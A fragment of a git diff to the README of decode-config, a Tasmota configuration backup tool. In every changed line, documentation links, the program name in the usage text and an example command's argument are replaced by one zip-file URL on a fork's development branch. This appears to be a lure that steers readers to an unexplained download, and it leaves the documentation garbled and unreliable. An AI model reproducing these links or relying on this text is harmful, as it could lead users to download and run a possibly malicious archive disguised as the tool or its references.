+for device in (tasmota1 tasmota2 tasmota3) do decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s %device -o Config_@d_@v
 ```
 
 will produce JSON configuration files for host tasmota1, tasmota2 and tasmota3 using friendly name and Tasmota firmware version for backup filenames.
@@ -623,14 +623,14 @@ This file format can be created by **decode-config** using the backup function (
 
 ### .json format
 
-This format uses the [JSON](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) notation and contains the complete configuration data in plain text, human readable and editable.
+This format uses the [JSON](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) notation and contains the complete configuration data in plain text, human readable and editable.
 
 The .json format can be created by **decode-config** using the backup function (`--backup-file <filename>`) (for better identification you can append the optional parameter `--backup-type json`, but that's optional as json is the default backup format).
 
 In contrast to the other two binary formats [.dmp](#dmp-format) and [.bin](#bin-format), this type of format also allows the [partial modification](#restore-a-subset-of-backup-data) of configurations.
 
 > **Note**  
-The keys used within the JSON file are based on the variable names of Tasmota source code in [settings.h](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) so they do not have the same naming as known for Tasmota web commands. However, since the variable names are self-explanatory, there should be no difficulties in assigning the functionality of the variables.
+The keys used within the JSON file are based on the variable names of Tasmota source code in [settings.h](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) so they do not have the same naming as known for Tasmota web commands. However, since the variable names are self-explanatory, there should be no difficulties in assigning the functionality of the variables.
 
 ### .bin format
 
@@ -656,7 +656,7 @@ A short list of possible program args is displayed using `-h` or `--help`.
 For advanced help use parameter `-H` or `--full-help`:
 
 ```help
-usage: https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip [-s <filename|host|url>] [-i <restorefile>]
+usage: https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip [-s <filename|host|url>] [-i <restorefile>]
                         [-o <backupfile>] [-t json|bin|dmp] [-E] [-e] [-F]
                         [--json-indent <indent>] [--json-compact]
                         [--json-show-pw] [--cmnd-indent <indent>]
@@ -669,7 +669,7 @@ usage: https://raw.githubusercontent.com/jonathanloucks/decode-config/developmen
 Backup/Restore Tasmota configuration data. Args that start with '--' (eg. -s)
 can also be set in a config file (specified via -c). Config file syntax
 allows: key=value, flag=true, stuff=[a,b,c] (for details, see syntax at
-https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip). If an arg is specified in more than one place, then
+https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip). If an arg is specified in more than one place, then
 commandline values override config file values which override defaults.
 
 Source:
@@ -781,7 +781,7 @@ The parameters listed here continue to work and are supported, but are no longer
 
 #### Obsolete source parameters
 
-The following source selection parameters are completely replaced by a single used [`-s`](#--full-help) or [`--source`](#--full-help) parameter; use [`-s`](#--full-help) or [`--source`](#--full-help) with a [http-url](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip):
+The following source selection parameters are completely replaced by a single used [`-s`](#--full-help) or [`--source`](#--full-help) parameter; use [`-s`](#--full-help) or [`--source`](#--full-help) with a [http-url](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip):
 
 * `-f`, `--file`, `--tasmota-file`, `tasmotafile` `<filename>`  
 file used for the Tasmota configuration (default: None)'
